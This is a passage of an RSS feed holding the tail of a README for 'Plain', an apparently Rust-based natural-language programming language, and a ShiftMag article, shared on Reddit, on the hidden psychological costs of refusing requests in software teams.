href="https://github.com#api-reference"></a><p></p><h3>Core Functions</h3><a href="https://github.com#core-functions"></a> <h4><code>parse(input: &amp;str) -&gt; Result<stmt></stmt></code></h4><a href="https://github.com#parseinput-str---resultstmt-string"></a><p>Parses Plain source code into an AST statement.</p><h4><code>Runtime::new() -&gt; Runtime</code></h4><a href="https://github.com#runtimenew---runtime"></a><p>Creates a new execution environment.</p><h4><code>Runtime::exec_stmt(&amp;mut self, stmt: &amp;Stmt) -&gt; Result&lt;(), String&gt;</code></h4><a href="https://github.com#runtimeexec_stmtmut-self-stmt-stmt---result-string"></a><p>Executes an AST statement in the current environment.</p><h3>Data Structures</h3><a href="https://github.com#data-structures"></a><p></p><h4><code>Runtime</code></h4><a href="https://github.com#runtime"></a> <ul> <li><code>vars: HashMap<string></string></code> - Variable storage</li> <li><code>last_value: Option<value></value></code> - Most recent result for pronouns</li> </ul> <h4><code>Value</code> enum</h4><a href="https://github.com#value-enum"></a> <ul> <li><code>Int(i64)</code> - Integer values</li> <li><code>Str(String)</code> - String values</li> </ul><p></p><h2>Development</h2><a href="https://github.com#development"></a> <h3>Project Structure</h3><a href="https://github.com#project-structure"></a><div><pre><code>plain-lang/ &#9500;&#9472;&#9472; src/ &#9474; &#9500;&#9472;&#9472; main.rs # CLI and main entry point &#9474; &#9500;&#9472;&#9472; lexer.rs # Tokenization logic &#9474; &#9500;&#9472;&#9472; parser.rs # Language grammar and parsing &#9474; &#9500;&#9472;&#9472; ast.rs # Abstract syntax tree definitions &#9474; &#9500;&#9472;&#9472; runtime.rs # Execution environment &#9474; &#9500;&#9472;&#9472; repl.rs # Interactive shell &#9474; &#9500;&#9472;&#9472; codegen.rs # Code generation (future JIT) &#9474; &#9492;&#9472;&#9472; typecheck.rs # Type checking (future features) &#9500;&#9472;&#9472; examples/ # Sample Plain programs &#9500;&#9472;&#9472; tests/ # Unit and integration tests &#9492;&#9472;&#9472; Cargo.toml # Project configuration </code></pre></div><p></p><h3>Adding New Features</h3><a href="https://github.com#adding-new-features"></a> <ol> <li><strong>Lexer</strong>: Add new tokens to <code>Token</code> enum in <code>lexer.rs</code></li> <li><strong>Parser</strong>: Extend <code>parse_stmt</code> and <code>parse_expr</code> functions</li> <li><strong>AST</strong>: Add new variants to <code>Stmt</code> and <code>Expr</code> enums</li> <li><strong>Runtime</strong>: Implement execution logic for new features</li> <li><strong>Tests</strong>: Add test cases for new functionality</li> </ol> <h3>Testing Framework</h3><a href="https://github.com#testing-framework"></a><div><pre><span><span>#</span> Run all tests</span> cargo <span>test</span> <span><span>#</span> Run specific test</span> cargo <span>test</span> test_parser <span><span>#</span> Run with verbose output</span> cargo <span>test</span> -- --nocapture</pre></div><p></p><h2>Testing</h2><a href="https://github.com#testing"></a> <h3>Test Categories</h3><a href="https://github.com#test-categories"></a> <ul> <li><strong>Unit Tests</strong>: Individual component testing</li> <li><strong>Integration Tests</strong>: End-to-end program execution</li> <li><strong>Parser Tests</strong>: Grammar and syntax validation</li> <li><strong>Runtime Tests</strong>: Execution correctness</li> </ul><p></p><h3>Writing Tests</h3><a href="https://github.com#writing-tests"></a><div><pre><span>#<span>[</span>test<span>]</span></span> <span>fn</span> <span>test_basic_assignment</span><span>(</span><span>)</span> <span>{</span> <span>let</span> input = <span>"set the value to 42."</span><span>;</span> <span>let</span> result = <span>parse</span><span>(</span>input<span>)</span><span>;</span> <span>assert</span><span>!</span><span>(</span>result<span>.</span>is_ok<span>(</span><span>)</span><span>)</span><span>;</span> <span>let</span> <span>mut</span> runtime = <span>Runtime</span><span>::</span><span>new</span><span>(</span><span>)</span><span>;</span> <span>let</span> stmt = result<span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span> <span>assert</span><span>!</span><span>(</span>runtime<span>.</span>exec_stmt<span>(</span><span>&amp;</span>stmt<span>)</span><span>.</span>is_ok<span>(</span><span>)</span><span>)</span><span>;</span> <span>assert_eq</span><span>!</span><span>(</span>runtime<span>.</span>vars<span>.</span>get<span>(</span><span>"value"</span><span>)</span><span>,</span> <span>Some</span><span>(</span><span>&amp;</span><span>Value</span><span>::</span><span>Int</span><span>(</span><span>42</span><span>)</span><span>)</span><span>)</span><span>;</span> <span>}</span></pre></div><h2>Contributing</h2><a href="https://github.com#contributing"></a><p>We welcome contributions! Please follow these guidelines:</p><h3>Development Workflow</h3><a href="https://github.com#development-workflow"></a> <ol> <li>Fork the repository</li> <li>Create a feature branch: <code>git checkout -b feature/new-feature</code></li> <li>Commit your changes: <code>git commit -am 'Add new feature'</code></li> <li>Push to the branch: <code>git push origin feature/new-feature</code></li> <li>Submit a pull request</li> </ol><p></p><h3>Code Standards</h3><a href="https://github.com#code-standards"></a> <ul> <li><strong>Rust Style</strong>: Follow standard Rust formatting (<code>cargo fmt</code>)</li> <li><strong>Documentation</strong>: Add doc comments for public APIs</li> <li><strong>Testing</strong>: Include tests for new functionality</li> <li><strong>Error Handling</strong>: Use descriptive error messages</li> <li><strong>Performance</strong>: Consider efficiency in algorithm design</li> </ul> <h3>Areas for Contribution</h3><a href="https://github.com#areas-for-contribution"></a> <ul> <li><strong>New Language Features</strong>: Control flow, functions, data structures</li> <li><strong>Performance Optimization</strong>: JIT compilation, caching</li> <li><strong>Error Handling</strong>: Better error messages and recovery</li> <li><strong>Tooling</strong>: IDE support, debuggers, formatters</li> <li><strong>Documentation</strong>: Tutorials, examples, language specification</li> </ul><p></p><h2>License</h2><a href="https://github.com#license"></a><p>This project is licensed under the MIT License - see the <a href="https://github.com/StudioPlatforms/plain-lang/blob/main/LICENSE">LICENSE</a> file for details.</p><h3>MIT License Summary</h3><a href="https://github.com#mit-license-summary"></a><p>Copyright (c) 2025 Studio Platforms</p><p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p><p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p><hr> <h2>Acknowledgments</h2><a href="https://github.com#acknowledgments"></a> <ul> <li><strong>Rust Community</strong>: For the excellent language and ecosystem</li> <li><strong>Logos</strong>: Efficient tokenization library</li> <li><strong>Chumsky</strong>: Parser combinator framework (inspiration)</li> <li><strong>Open Source Community</strong>: For inspiration and tools</li> </ul><p></p><h2>Future Roadmap</h2><a href="https://github.com#future-roadmap"></a> <ul> <li> <strong>Function Definitions</strong>: <code>define function_name as ...</code></li> <li> <strong>Data Structures</strong>: Arrays and objects</li> <li> <strong>File I/O</strong>: Reading and writing files</li> <li> <strong>Modules</strong>: Code organization and imports</li> <li> <strong>JIT Compilation</strong>: Performance optimization with Cranelift</li> <li> <strong>Debugger</strong>: Step-through execution and breakpoints</li> <li> <strong>Package Manager</strong>: Dependency management</li> <li> <strong>Web Integration</strong>: Browser-based execution</li> </ul> <hr><p><em>Plain: Making programming as natural as conversation.</em></p></article></div></section>]]></description><pubDate>Fri, 05 Sep 2025 16:23:29 +0530</pubDate></item><item><link>https://shiftmag.dev/saying-no-is-not-a-free-action-in-the-world-of-software-engineering-5339/</link><title>The hidden costs of saying “no” in software engineering (shiftmag.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n8gpkk/the_hidden_costs_of_saying_no_in_software/</guid><comments>https://www.reddit.com/r/programming/comments/1n8gpkk/the_hidden_costs_of_saying_no_in_software/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1n8gpkk/the_hidden_costs_of_saying_no_in_software/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>At ShiftMag we recently explored an angle of software engineering that doesn’t get much attention: the cost of saying “no”.</p><p>We often hear that being able to refuse is a vital soft skill – but refusing also carries a psychological and professional price. Declining can create stress, trigger anxiety, and even feel like a career risk, especially in environments where overcommitment is the norm. </p><p>Meanwhile, saying “yes” is usually rewarded in the short term, even if it leads to burnout later.This raises some questions for us as a profession:</p><p>How do you personally navigate the emotional toll of refusing requests at work?Have you seen “just say no” advice backfire in your teams?</p><p>What practices have you found effective for making refusal safer and healthier in professional environments?</p><p>We’d love to hear how others in the community experience and handle this dynamic.</p></div><!-- SC_ON --></section><section class='separator separator-after-selftext'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>'Who could refuse that?' Turns out, almost no one - especially when faced with puppy eyes, heartfelt asks, or a desperate Pikachu. Refusing is hard, and it costs more than we admit. </p></div><div><figure><img width="1200" height="630" src="https://shiftmag.dev/wp-content/uploads/2025/06/saying-no.png?x73249" alt srcset="https://shiftmag.dev/wp-content/uploads/2025/06/saying-no.png 1200w, https://shiftmag.dev/wp-content/uploads/2025/06/saying-no-300x158.png 300w, https://shiftmag.dev/wp-content/uploads/2025/06/saying-no-1024x538.png 1024w, https://shiftmag.dev/wp-content/uploads/2025/06/saying-no-768x403.png 768w"></figure><p>We all agree: <strong>saying <em>no</em> is important</strong> &ndash; it can be liberating, support work-life balance, and is a crucial life skill.</p><p>What&rsquo;s discussed far less is the cost of refusing, especially the <strong>psychological cost</strong>. That&rsquo;s what I&rsquo;d like to explore: the emotional toll of refusing &ndash; on ourselves and on those we ask for something, even when we reassure them, &ldquo;It&rsquo;s totally fine if you can&rsquo;t.&rdquo;</p><h2>It&rsquo;s hard to refuse &ndash; and all too easy to agree</h2><p>Overall, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2443710/">saying <em>no</em> often carries negative connotations</a>, which is why we tend to avoid it. We dislike being in situations where <strong>our words or actions might be perceived as negative</strong>. It becomes even more difficult to decline in person &ndash; especially when we know the person well or feel emotionally connected to them or the topic.</p><blockquote><p>People are generally more dismissive online or in anonymous settings, where <strong>the perceived consequences are minimal</strong>. It&rsquo;s much easier to ignore or mock a request to &ldquo;like&rdquo; a post on social media than to say <em>no</em> to your mum when she asks for help picking apples.</p></blockquote><p>In a professional setting, declining becomes even more complicated.</p><p>We&rsquo;ve created a work culture where <strong>declining requests too often can feel like a career risk</strong>, especially for <a href="https://shiftmag.dev/the-journey-of-a-lone-female-software-developer-2876/">women</a> and members of <a href="https://www.harpersbazaar.com/culture/features/a36687625/naomi-osaka-and-the-cost-of-saying-no/">minority groups</a>. Declining isn&rsquo;t only disappointing for the person who asked; it might also mean missing out on a promotion or an exciting opportunity. <a href="https://en.wikipedia.org/wiki/Carp">Holy carp</a>!</p><p>Conversely, <strong>accepting is effortless</strong>. </p><p>It feels nice and positive. You&rsquo;re pleasing the other person, maybe even securing a future reward for yourself. What could be better? Since <a href="https://en.wikipedia.org/wiki/Hyperbolic_discounting">humans are wired to chase immediate rewards</a> and often <a href="http://spia.uga.edu/faculty_pages/tyler.scott/teaching/PADP6950_Spring2017/Readings/Odonoghue.Rabin.2000.pdf">overlook future pain</a>, we tend to say <em>yes</em> just to see that happy twinkle in someone&rsquo;s eye &ndash; consequences be damned!</p><p>If you Google <a href="https://www.google.com/search?q=how+to+say+no">&ldquo;how to say no&rdquo;</a>, you&rsquo;ll get a lot of results, mostly focused on the actual skill of rejecting something. If you Google <a href="https://www.google.com/search?q=how+to+say+yes">&ldquo;how to say yes&rdquo;</a>, you mostly get results about how to say words and phrases in different languages. <strong>Declining is a tricky soft skill</strong>; accepting is often just about language.</p><h2><span>Turning something down is&hellip; stressful.</span></h2><p>So, where are we with <em>no</em>?</p><ul> <li>We&rsquo;re not that great at saying it.</li> <li>It&rsquo;s not a pleasant thing to do.</li> <li>It can have negative consequences.</li> </ul><p>As a result,<strong> it&rsquo;s often stressful to refuse a request</strong>. </p><p>We tend to worry about it before, during, and after the fact. This stress can be even worse if we&rsquo;re already dealing with things like <strong>burnout, impostor syndrome, or anxiety</strong>. Saying <em>no</em> in those situations can feel like adding fuel to the fire. If I already don&rsquo;t believe I&rsquo;m doing a stellar job, turning something down might only reinforce the fear that others see me as a failure.</p><blockquote><p>Our tendency toward <a href="https://en.wikipedia.org/wiki/Herd_mentality">herd mentality</a> doesn&rsquo;t help either. When most of the team says <em>yes</em> and we&rsquo;re the only ones who want to say <em>no</em>, <strong>we often end up going along with the group</strong>, even if we feel conflicted inside.</p></blockquote><p>Many of us have experienced this in sprint planning and sprint reviews &ndash; the team takes on more work than necessary during planning to avoid refusing requests, and then feels deflated and disappointed when they can&rsquo;t deliver everything by the end. Over time, this can <strong>hurt team morale and spirit</strong>, lower motivation, and even create a toxic dynamic between teams and their stakeholders.</p><p>All of this leads to a simple point: <strong>refusing comes with its own burden</strong>. Telling someone to &ldquo;just say <em>no</em>&rdquo; can be disingenuous &ndash; placing the emotional and social cost of rejection on them, while pretending it&rsquo;s easy.</p><h2><span>Expecting a simple refusal hurts the ones who care most</span></h2><p>The people who are most invested in a project, those who care deeply about the quality of their work and their team&rsquo;s delivery, often your &ldquo;best performers&rdquo;, are <strong>usually the ones who find it hardest to say <em>no</em></strong>. As a result, they often take the initiative to pick up tasks that others might reject.</p><p>If you keep asking, they may continue to agree, depending on their situation, until they eventually hit a wall and burn out.</p><h2><span>Be kind. Don&rsquo;t act like <em>no</em> is just a simple word</span></h2><p>We should be<strong> mindful of our colleagues&rsquo; workloads</strong> and, whenever possible, avoid asking them for additional tasks if we know they might already have a full plate. </p><blockquote><p>It&rsquo;s important to recognize that they may feel unable or reluctant to refuse, even when they want to. And even when they do refuse, it can still come at a cost to their emotional well-being or personal life.</p></blockquote><p>We should also recognize that <strong>refusal comes in many forms</strong>. It can mean:</p><ul> <li>Literally saying <em>no</em>.</li> <li>Taking only 5 tasks out of 10 that were offered.</li> <li>Choosing not to volunteer when most others do.</li> <li>Not attending a meeting or participating in a Slack discussion.</li> </ul><p>All of the above can be difficult to do and <strong>may lead to negative consequences down the road</strong>, for both the individual and the team.</p><h2><span>What&rsquo;s the solution?</span></h2> <ul> <li><strong>Talk openly with your colleagues.</strong> Be aware of the challenges they face and the workloads they carry. Don&rsquo;t expect them to simply reject additional work &ndash; understand their situation through honest conversations.</li> <li><strong>Keep expectations realistic.</strong> Avoid presenting people or teams with overwhelming wish lists they can&rsquo;t reasonably deliver. Don&rsquo;t assume others will just say <em>no</em> to unreasonable demands.</li> <li><strong>Diversify your requests for help.</strong> Instead of always turning to the same people who tend to say <em>yes</em>, reach out to others and distribute the load more evenly.</li> <li><strong>Avoid herd mentality pressure.</strong> Give individuals space and time to make decisions independently, and encourage sharing outcomes in a safe environment. This is why practices like writing retrospective points individually or revealing estimations simultaneously in planning poker are important.</li> <li><strong>Lead by example.</strong> Show that saying <em>no</em> when it&rsquo;s appropriate is acceptable. Recognize that you might also struggle with this and discuss it openly with your team.</li> <li><strong>Establish fair systems and processes.</strong> Ensure workloads are distributed transparently and fairly, rather than relying on informal methods that often favor those who find it easier to say <em>no</em> &ndash; which can unfairly burden those who care most about the project&rsquo;s success.</li> <li><strong>Don&rsquo;t reward or idolize overwork.</strong> Encourage a culture that values balance and sustainable effort over relentless hustle.</li> </ul> </div></section>]]></description><pubDate>Thu, 04 Sep 2025 23:05:17 +0530</pubDate></item></channel></rss>
